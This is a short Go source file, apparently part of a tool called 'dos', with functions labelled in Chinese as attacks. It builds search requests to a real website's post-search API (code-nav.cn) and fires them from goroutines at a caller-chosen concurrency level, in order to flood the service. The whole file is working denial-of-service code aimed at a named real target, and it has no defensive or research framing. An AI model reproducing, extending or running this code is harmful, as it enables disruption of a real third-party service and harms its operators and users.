package attack

import (
	"dos/model"
	"dos/utils"
	"encoding/json"
)

// BCDHAttack 编程导航攻击
type BCDHAttack struct {
}

func NewBCDHAttack() *BCDHAttack {
	return &BCDHAttack{}
}

func (b *BCDHAttack) InterviewAttack(concurrencyLevel int) {
	req := model.NewInterviewReq(
		"面试题",
		10,
		20,
		1,
		"createTime",
		"descend",
		[]string{"Java"})
	headers := map[string]string{}
	headers["Content-Type"] = "application/json"
	marshal, _ := json.Marshal(req)
	dos := utils.NewHttpDos(""+
		"https://www.code-nav.cn/api/post/search/page/vo",
		marshal,
		headers)
	for i := 0; i < concurrencyLevel; i++ {
		go func() {
			dos.Post()
		}()
	}
}

// BiographicalNotesAttack 简历攻击
func (b *BCDHAttack) BiographicalNotesAttack(concurrencyLevel int) {
	req := model.NewBiographicalNotesReq(
		20,
		20,
		"_score",
		"descend",
		"java",
		1)
	headers := map[string]string{}
	headers["Content-Type"] = "application/json"
	marshal, _ := json.Marshal(req)
	dos := utils.NewHttpDos(""+
		"https://www.code-nav.cn/api/post/search/page/vo",
		marshal,
		headers)
	for i := 0; i < concurrencyLevel; i++ {
		go func() {
			dos.Post()
		}()
	}
}
